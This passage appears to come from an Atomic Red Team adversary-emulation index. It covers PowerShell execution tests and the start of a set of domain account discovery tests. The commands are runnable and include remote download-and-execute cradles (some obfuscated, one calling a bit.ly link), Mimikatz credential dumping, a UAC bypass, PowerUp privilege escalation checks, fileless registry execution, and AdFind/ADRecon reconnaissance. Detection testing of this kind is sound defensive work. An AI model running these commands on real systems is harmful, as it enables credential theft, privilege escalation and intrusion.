                "auto_generated_guid": "a21bb23e-e677-4ee7-af90-6931b57b6350",
                "description": "Upon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "file_path": {
                        "description": "File path for SharpHound payload",
                        "type": "String",
                        "default": "PathToAtomicsFolder\\T1059.001\\src"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "SharpHound.ps1 must be located at #{file_path}\n",
                        "prereq_command": "if (Test-Path #{file_path}\\SharpHound.ps1) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest \"https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1\" -OutFile \"#{file_path}\\SharpHound.ps1\"\n"
                    }
                ],
                "executor": {
                    "command": "write-host \"Import and Execution of SharpHound.ps1 from #{file_path}\" -ForegroundColor Cyan\nimport-module #{file_path}\\SharpHound.ps1\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n",
                    "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Run Bloodhound from Memory using Download Cradle",
                "auto_generated_guid": "bf8c1441-4674-4dab-8e4e-39d93d08f9b7",
                "description": "Upon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n",
                    "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Obfuscation Tests",
                "auto_generated_guid": "4297c41a-8168-4138-972d-01f3ee92c804",
                "description": "Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Mimikatz - Cradlecraft PsSendKeys",
                "auto_generated_guid": "af1800cf-9f9d-4fd1-a709-14b1e6de020d",
                "description": "Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n",
                    "name": "powershell",
                    "elevation_required": true
                }
            },
            {
                "name": "Invoke-AppPathBypass",
                "auto_generated_guid": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
                "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Powershell MsXml COM object - with prompt",
                "auto_generated_guid": "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da",
                "description": "Powershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "url": {
                        "description": "url of payload to execute",
                        "type": "Url",
                        "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1"
                    }
                },
                "executor": {
                    "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Powershell XML requests",
                "auto_generated_guid": "4396927f-e503-427b-b023-31049b9b09a6",
                "description": "Powershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "url": {
                        "description": "url of payload to execute",
                        "type": "Url",
                        "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml"
                    }
                },
                "executor": {
                    "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Powershell invoke mshta.exe download",
                "auto_generated_guid": "8a2ad40b-12c7-4b25-8521-2737b0a415af",
                "description": "Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "url": {
                        "description": "url of payload to execute",
                        "type": "Url",
                        "default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct"
                    }
                },
                "executor": {
                    "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Powershell Invoke-DownloadCradle",
                "auto_generated_guid": "cc50fa2a-a4be-42af-a88f-e347ba0bf4d7",
                "description": "Provided by https://github.com/mgreen27/mgreen27.github.io\nInvoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "steps": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n",
                    "name": "manual"
                }
            },
            {
                "name": "PowerShell Fileless Script Execution",
                "auto_generated_guid": "fa050f5e-bc75-4230-af73-b6fd7852cd73",
                "description": "Execution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that\nart-marker.txt is in the folder.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n",
                    "cleanup_command": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore\n",
                    "name": "powershell",
                    "elevation_required": true
                }
            },
            {
                "name": "PowerShell Downgrade Attack",
                "auto_generated_guid": "9148e7c4-9356-420e-a416-e896e9c0f73e",
                "description": "This test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n",
                "supported_platforms": [
                    "windows"
                ],
                "dependencies": [
                    {
                        "description": "PowerShell version 2 must be installed\n",
                        "prereq_command": "if(2 -in $PSVersionTable.PSCompatibleVersions.Major) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Write-Host  Automated installer not implemented yet, please install PowerShell v2 manually\n"
                    }
                ],
                "executor": {
                    "command": "powershell.exe -version 2 -Command Write-Host $PSVersion\n",
                    "name": "powershell"
                }
            },
            {
                "name": "NTFS Alternate Data Stream Access",
                "auto_generated_guid": "8e5c5532-1181-4c1d-bb79-b3a9f5dbd680",
                "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "ads_file": {
                        "description": "File created to store Alternate Stream Data",
                        "type": "String",
                        "default": "$env:TEMP\\NTFS_ADS.txt"
                    }
                },
                "dependencies": [
                    {
                        "description": "Homedrive must be an NTFS drive\n",
                        "prereq_command": "if((Get-Volume -DriveLetter $env:HOMEDRIVE[0]).FileSystem -contains \"NTFS\") {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Write-Host Prereq's for this test cannot be met automatically\n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "command": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n",
                    "cleanup_command": "Remove-Item #{ads_file} -Force -ErrorAction Ignore\n"
                }
            },
            {
                "name": "PowerShell Session Creation and Use",
                "auto_generated_guid": "7c1acec2-78fa-4305-a3e0-db2a54cddecd",
                "description": "Connect to a remote powershell session and interact with the host.\nUpon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "hostname_to_connect": {
                        "description": "The host to connect to, by default it will connect to the local machine",
                        "type": "String",
                        "default": "$env:COMPUTERNAME"
                    }
                },
                "dependencies": [
                    {
                        "description": "PSRemoting must be enabled\n",
                        "prereq_command": "Try {\n    New-PSSession -ComputerName #{hostname_to_connect} -ErrorAction Stop | Out-Null\n    exit 0\n} \nCatch {\n    exit 1\n}\n",
                        "get_prereq_command": "Enable-PSRemoting\n"
                    }
                ],
                "executor": {
                    "name": "powershell",
                    "elevation_required": true,
                    "command": "New-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n"
                }
            },
            {
                "name": "ATHPowerShellCommandLineParameter -Command parameter variations",
                "auto_generated_guid": "686a9785-f99b-41d4-90df-66ed515f81d7",
                "description": "Executes powershell.exe with variations of the -Command parameter",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "command_line_switch_type": {
                        "description": "The type of supported command-line switch to use",
                        "type": "String",
                        "default": "Hyphen"
                    },
                    "command_param_variation": {
                        "description": "The \"Command\" parameter variation to use",
                        "type": "String",
                        "default": "C"
                    }
                },
                "dependencies": [
                    {
                        "description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
                        "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
                        "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                    }
                ],
                "executor": {
                    "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop",
                    "name": "powershell"
                }
            },
            {
                "name": "ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments",
                "auto_generated_guid": "1c0a870f-dc74-49cf-9afc-eccc45e58790",
                "description": "Executes powershell.exe with variations of the -Command parameter with encoded arguments supplied",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "command_line_switch_type": {
                        "description": "The type of supported command-line switch to use",
                        "type": "String",
                        "default": "Hyphen"
                    },
                    "command_param_variation": {
                        "description": "The \"Command\" parameter variation to use",
                        "type": "String",
                        "default": "C"
                    },
                    "encoded_arguments_param_variation": {
                        "description": "The \"EncodedArguments\" parameter variation to use",
                        "type": "String",
                        "default": "EA"
                    }
                },
                "dependencies": [
                    {
                        "description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
                        "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
                        "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                    }
                ],
                "executor": {
                    "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
                    "name": "powershell"
                }
            },
            {
                "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations",
                "auto_generated_guid": "86a43bad-12e3-4e85-b97c-4d5cf25b95c3",
                "description": "Executes powershell.exe with variations of the -EncodedCommand parameter",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "command_line_switch_type": {
                        "description": "The type of supported command-line switch to use",
                        "type": "String",
                        "default": "Hyphen"
                    },
                    "encoded_command_param_variation": {
                        "description": "The \"EncodedCommand\" parameter variation to use",
                        "type": "String",
                        "default": "E"
                    }
                },
                "dependencies": [
                    {
                        "description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
                        "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
                        "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                    }
                ],
                "executor": {
                    "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop",
                    "name": "powershell"
                }
            },
            {
                "name": "ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments",
                "auto_generated_guid": "0d181431-ddf3-4826-8055-2dbf63ae848b",
                "description": "Executes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "encoded_command_param_variation": {
                        "description": "The \"EncodedCommand\" parameter variation to use",
                        "type": "String",
                        "default": "E"
                    },
                    "command_line_switch_type": {
                        "description": "The type of supported command-line switch to use",
                        "type": "String",
                        "default": "Hyphen"
                    },
                    "encoded_arguments_param_variation": {
                        "description": "The \"EncodedArguments\" parameter variation to use",
                        "type": "String",
                        "default": "EncodedArguments"
                    }
                },
                "dependencies": [
                    {
                        "description": "The AtomicTestHarnesses module must be installed and Out-ATHPowerShellCommandLineParameter must be exported in the module.",
                        "prereq_command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Out-ATHPowerShellCommandLineParameter']) {exit 1} else {exit 0}",
                        "get_prereq_command": "Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n"
                    }
                ],
                "executor": {
                    "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
                    "name": "powershell"
                }
            },
            {
                "name": "PowerShell Command Execution",
                "auto_generated_guid": "a538de64-1c74-46ed-aa60-b995ed302598",
                "description": "Use of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "obfuscated_code": {
                        "description": "Defaults to: Invoke-Expression with a \"Write-Host\" line.",
                        "type": "String",
                        "default": "JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA=="
                    }
                },
                "executor": {
                    "command": "powershell.exe -e  #{obfuscated_code}\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "PowerShell Invoke Known Malicious Cmdlets",
                "auto_generated_guid": "49eb9404-5e0f-4031-a179-b40f7be385e3",
                "description": "Powershell execution of known Malicious PowerShell Cmdlets",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "Malicious_cmdlets": {
                        "description": "Known Malicious Cmdlets",
                        "type": "String",
                        "default": "\"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"\n"
                    }
                },
                "executor": {
                    "name": "powershell",
                    "elevation_required": true,
                    "command": "$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}\n"
                }
            },
            {
                "name": "PowerUp Invoke-AllChecks",
                "auto_generated_guid": "1289f78d-22d2-4590-ac76-166737e1811b",
                "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n",
                    "name": "powershell"
                }
            }
        ]
    },
    {
        "attack_technique": "T1087.002",
        "display_name": "Account Discovery: Domain Account",
        "atomic_tests": [
            {
                "name": "Enumerate all accounts (Domain)",
                "auto_generated_guid": "6fbc9e68-5ad7-444a-bd11-8bf3136c477e",
                "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "net user /domain\nnet group /domain\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Enumerate all accounts via PowerShell (Domain)",
                "auto_generated_guid": "8b8a6449-be98-4f42-afd2-dedddc7453b2",
                "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "executor": {
                    "command": "net user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Enumerate logged on users via CMD (Domain)",
                "auto_generated_guid": "161dcd85-d014-4f5e-900c-d3eaae82a0f7",
                "description": "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "computer_name": {
                        "description": "Name of remote system to query",
                        "type": "String",
                        "default": "%COMPUTERNAME%"
                    }
                },
                "executor": {
                    "command": "query user /SERVER:#{computer_name}\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Automated AD Recon (ADRecon)",
                "auto_generated_guid": "95018438-454a-468c-a0fa-59c800149b59",
                "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "adrecon_path": {
                        "description": "Path of ADRecon.ps1 file",
                        "type": "Path",
                        "default": "$env:TEMP\\ADRecon.ps1"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "ADRecon must exist on disk at specified location (#{adrecon_path})\n",
                        "prereq_command": "if (Test-Path #{adrecon_path}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1\" -OutFile #{adrecon_path}\n"
                    }
                ],
                "executor": {
                    "command": "Invoke-Expression #{adrecon_path}\n",
                    "cleanup_command": "Remove-Item #{adrecon_path} -Force -ErrorAction Ignore | Out-Null\nGet-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse\n",
                    "name": "powershell"
                }
            },
            {
                "name": "Adfind -Listing password policy",
                "auto_generated_guid": "736b4f53-f400-4c22-855d-1a6b5a551600",
                "description": "Adfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "adfind_path": {
                        "description": "Path to the AdFind executable",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "AdFind.exe must exist on disk at specified location (#{adfind_path})\n",
                        "prereq_command": "if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile #{adfind_path}\n"
                    }
                ],
                "executor": {
                    "command": "#{adfind_path} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Adfind - Enumerate Active Directory Admins",
                "auto_generated_guid": "b95fd967-4e62-4109-b48d-265edfd28c3a",
                "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "adfind_path": {
                        "description": "Path to the AdFind executable",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "AdFind.exe must exist on disk at specified location (#{adfind_path})\n",
                        "prereq_command": "if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile #{adfind_path}\n"
                    }
                ],
                "executor": {
                    "command": "#{adfind_path} -sc admincountdmp\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Adfind - Enumerate Active Directory User Objects",
                "auto_generated_guid": "e1ec8d20-509a-4b9a-b820-06c9b2da8eb7",
                "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "adfind_path": {
                        "description": "Path to the AdFind executable",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "AdFind.exe must exist on disk at specified location (#{adfind_path})\n",
                        "prereq_command": "if (Test-Path #{adfind_path}) {exit 0} else {exit 1}\n",
                        "get_prereq_command": "Invoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/src/AdFind.exe\" -OutFile #{adfind_path}\n"
                    }
                ],
                "executor": {
                    "command": "#{adfind_path} -f (objectcategory=person)\n",
                    "name": "command_prompt"
                }
            },
            {
                "name": "Adfind - Enumerate Active Directory Exchange AD Objects",
                "auto_generated_guid": "5e2938fb-f919-47b6-8b29-2f6a1f718e99",
                "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
                "supported_platforms": [
                    "windows"
                ],
                "input_arguments": {
                    "adfind_path": {
                        "description": "Path to the AdFind executable",
                        "type": "Path",
                        "default": "PathToAtomicsFolder\\T1087.002\\src\\AdFind.exe"
                    }
                },
                "dependency_executor_name": "powershell",
                "dependencies": [
                    {
                        "description": "AdFind.exe must exist on disk at specified location (#{adfind_path})\n",
